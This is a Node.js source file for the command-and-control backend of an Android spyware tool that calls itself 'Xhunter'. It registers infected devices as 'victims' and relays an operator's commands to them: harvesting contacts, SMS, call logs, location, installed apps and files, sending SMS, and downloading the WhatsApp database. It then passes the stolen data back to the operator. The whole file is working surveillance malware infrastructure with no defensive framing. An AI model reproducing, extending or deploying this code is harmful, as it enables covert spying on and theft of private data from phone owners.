
const express = require('express');
const app = express();
const server = require('http').createServer(app);
const { Server } = require('socket.io');

const io = new Server(server, {
  maxHttpBufferSize: 1e7, // 10MB
});

const victimList = new Map();
const deviceList = new Map();
const victimData = new Map();
let adminSocketId = null;

const PORT = process.env.PORT || 8080;

server.listen(PORT, (err) => {
  if (err) return console.error("Server failed to start:", err);
  log("Server Started : " + PORT);
});

app.get('/', (req, res) => {
  res.send('Welcome to Xhunter Backend Server!!');
});

io.on('connection', (socket) => {

  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    for (let [id, data] of victimData.entries()) {
      socket.emit("join", data);
    }
  });

  socket.on('request', (d) => {
    try {
      let { to, action, data } = JSON.parse(d);
      if (!victimList.has(to)) return log("Invalid target victim ID.");
      log("Requesting action: " + action);
      io.to(victimList.get(to)).emit(action, data);
    } catch (err) {
      log("Invalid JSON in 'request': " + err.message);
    }
  });

  socket.on('join', (device) => {
    log("Victim joined => socketId " + socket.id);
    victimList.set(device.id, socket.id);
    victimData.set(device.id, { ...device, socketId: socket.id });
    deviceList.set(socket.id, {
      id: device.id,
      model: device.model
    });

    if (adminSocketId) {
      io.to(adminSocketId).emit("join", { ...device, socketId: socket.id });
    }
  });

  const actions = [
    'getDir',
    'getInstalledApps',
    'getContacts',
    'sendSMS',
    'getCallLog',
    'previewImage',
    'error',
    'getSMS',
    'getLocation'
  ];

  actions.forEach(action => {
    socket.on(action, (data) => response(action, data));
  });

  socket.on("download", (data, callback) => {
    responseBinary("download", data, callback);
  });

  socket.on("downloadWhatsappDatabase", (data, callback) => {
    if (!data?.to || !victimList.has(data.to)) {
      log("Invalid or missing target in downloadWhatsappDatabase");
      return;
    }
    io.to(victimList.get(data.to)).emit("downloadWhatsappDatabase", data, callback);
  });

  socket.on('disconnect', () => {
    if (socket.id === adminSocketId) {
      adminSocketId = null;
    } else {
      response("disconnectClient", socket.id);
      const device = deviceList.get(socket.id);
      if (device) {
        victimList.delete(device.id);
        victimData.delete(device.id);
        deviceList.delete(socket.id);
      }
    }
  });

});

function response(action, data) {
  if (adminSocketId) {
    log("Response action: " + action);
    io.to(adminSocketId).emit(action, data);
  }
}

function responseBinary(action, data, callback) {
  if (adminSocketId) {
    log("Response binary action: " + action);
    callback("success");
    io.to(adminSocketId).emit(action, data);
  }
}

function log(message) {
  console.log("[LOG]", message);
}
